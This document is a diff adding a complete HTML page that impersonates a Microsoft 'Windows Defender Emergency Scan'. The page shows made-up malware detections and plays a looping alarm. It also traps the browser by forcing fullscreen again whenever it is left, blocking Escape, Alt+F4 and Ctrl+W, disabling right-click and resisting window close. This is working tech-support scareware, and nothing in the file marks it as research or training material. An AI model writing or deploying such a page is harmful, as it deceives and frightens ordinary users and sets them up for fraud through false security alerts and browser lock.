@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Security Emergency</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Windows 11 Styling */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #000;
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Microsoft Logo Fix */
+        .ms-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 120px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Scan Initiation Button */
+        #initiateButton {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px 40px;
+            font-size: 18px;
+            background: #0078D4;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        #initiateButton:hover {
+            background: #006CBB;
+        }
+
+        /* Scan Interface */
+        .scan-interface {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(25, 25, 25, 0.95);
+            padding: 40px;
+            border-radius: 8px;
+            width: 700px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 25px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #0078D4;
+            transition: width 0.5s;
+        }
+
+        /* Threat Display */
+        .threat-list {
+            background: rgba(255, 0, 0, 0.05);
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 6px;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://www.freepnglogos.com/uploads/microsoft-logo-4.png" class="ms-logo" alt="Microsoft">
+    <button id="initiateButton">Start Security Scan Now</button>
+
+    <div class="scan-interface" id="scanInterface">
+        <h2 style="color: #ff4444;">🛡️ Windows Defender Emergency Scan</h2>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="threat-list" id="threatList">
+            <!-- Threats will be populated here -->
+        </div>
+        <div style="color: #ff4444; margin-top: 20px;" id="warningMessage">
+            ⚠ DO NOT CLOSE THIS WINDOW - CRITICAL SYSTEM FILES BEING SCANNED
+        </div>
+    </div>
+
+    <audio id="alertSound" loop>
+        <source src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        $(document).ready(function() {
+            // Initialize threat database
+            const threats = [
+                "Trojan:Win32/Wacatac.B!ml detected in system32",
+                "Ransomware:Behavior/FileCrypter activity found",
+                "Memory injection in svchost.exe (PID: 4416)",
+                "Unauthorized registry modifications detected",
+                "Network anomaly: Suspicious outgoing traffic"
+            ];
+
+            // Scan initiation handler
+            $('#initiateButton').click(function() {
+                $(this).hide();
+                $('#scanInterface').fadeIn();
+                startFullscreenLockdown();
+                beginScanSimulation();
+            });
+
+            function beginScanSimulation() {
+                let progress = 0;
+                const scanInterval = setInterval(() => {
+                    progress += Math.random() * 5;
+                    $('#progressFill').css('width', progress + '%');
+                    
+                    // Add random threats
+                    if(threats.length > 0 && Math.random() > 0.7) {
+                        $('#threatList').append(
+                            `<div style="margin: 8px 0; color: #ff6666;">🔴 ${threats.shift()}</div>`
+                        );
+                    }
+
+                    if(progress >= 100) {
+                        clearInterval(scanInterval);
+                        showCriticalAlert();
+                    }
+                }, 500);
+
+                // Start alert sound
+                document.getElementById('alertSound').play();
+            }
+
+            function startFullscreenLockdown() {
+                const elem = document.documentElement;
+                
+                // Request fullscreen
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+                else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+
+                // Block exit attempts
+                document.addEventListener('fullscreenchange', reengageFullscreen);
+                document.addEventListener('webkitfullscreenchange', reengageFullscreen);
+                document.addEventListener('mozfullscreenchange', reengageFullscreen);
+                document.addEventListener('msfullscreenchange', reengageFullscreen);
+
+                // Block keyboard shortcuts
+                document.addEventListener('keydown', blockKeys);
+                
+                // Block right click
+                document.addEventListener('contextmenu', blockRightClick);
+            }
+
+            function reengageFullscreen() {
+                if(!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    startFullscreenLockdown();
+                }
+            }
+
+            function blockKeys(e) {
+                // Block F11, Esc, Alt+F4, Ctrl+W
+                if(e.key === 'F11' || e.key === 'Escape' || 
+                  (e.altKey && e.key === 'F4') || 
+                  (e.ctrlKey && e.key === 'w')) {
+                    e.preventDefault();
+                }
+            }
+
+            function blockRightClick(e) {
+                e.preventDefault();
+                startFullscreenLockdown();
+            }
+
+            // Prevent window closing
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+            };
+        });
+    </script>
+</body>
+</html>
